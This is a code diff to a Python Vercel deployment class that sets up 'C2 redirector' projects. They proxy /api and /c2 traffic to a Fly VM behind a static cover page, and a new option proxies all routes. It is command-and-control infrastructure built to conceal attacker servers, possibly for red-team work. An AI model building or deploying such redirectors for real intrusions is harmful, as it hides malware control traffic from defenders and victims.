@@ -41,9 +41,19 @@ class VercelDeployer:
     # Redirector deployment (reverse proxy → Fly VM)
     # ------------------------------------------------------------------
     def deploy_redirector(
-        self, target_host: str, target_port: int, suffix: str
+        self, target_host: str, target_port: int, suffix: str,
+        proxy_all: bool = False,
     ) -> Dict[str, Any]:
-        """Create a new Vercel project + deployment that proxies to the Fly VM."""
+        """Create a new Vercel project + deployment that proxies to the Fly VM.
+
+        Args:
+            target_host: Fly VM IP address.
+            target_port: Fly VM internal port (8443).
+            suffix: Unique suffix for project name.
+            proxy_all: If True, proxy ALL routes to the Fly VM (for full-stack
+                       apps like flipper). If False, only proxy /api/* and /c2/*
+                       (for C2 redirectors with a static cover page).
+        """
         team_id = self._resolve_team()
         project_name = f"{self.project_base}-{suffix}"
 
@@ -74,7 +84,7 @@ class VercelDeployer:
 
         files = [
             {"file": "index.html", "data": self._cover_page_html()},
-            {"file": "vercel.json", "data": self._vercel_config(target_url)},
+            {"file": "vercel.json", "data": self._vercel_config(target_url, proxy_all=proxy_all)},
             {"file": "package.json", "data": '{"name":"app","version":"1.0.0","private":true}'},
         ]
 
@@ -187,15 +197,27 @@ class VercelDeployer:
     # ------------------------------------------------------------------
     # Helpers
     # ------------------------------------------------------------------
-    def _vercel_config(self, target: str) -> str:
-        """vercel.json: rewrite /api/* to Fly VM, serve cover page for everything else."""
+    def _vercel_config(self, target: str, proxy_all: bool = False) -> str:
+        """vercel.json: rewrite routes to Fly VM.
+
+        If proxy_all: ALL routes proxy to the Fly VM (for full-stack apps like flipper).
+        Otherwise: only /api/* and /c2/* proxy, cover page served for everything else.
+        """
+        if proxy_all:
+            # Full proxy mode — every route goes to the Fly VM (flipper)
+            rewrites = [
+                {"source": "/(.*)", "destination": f"{target}/$1"},
+            ]
+        else:
+            # C2 redirector mode — only API routes proxy
+            rewrites = [
+                {"source": "/api/:path*", "destination": f"{target}/:path*"},
+                {"source": "/c2/:path*", "destination": f"{target}/:path*"},
+            ]
         return json.dumps(
             {
                 "version": 2,
-                "rewrites": [
-                    {"source": "/api/:path*", "destination": f"{target}/:path*"},
-                    {"source": "/c2/:path*", "destination": f"{target}/:path*"},
-                ],
+                "rewrites": rewrites,
                 "headers": [
                     {
                         "source": "/(.*)",
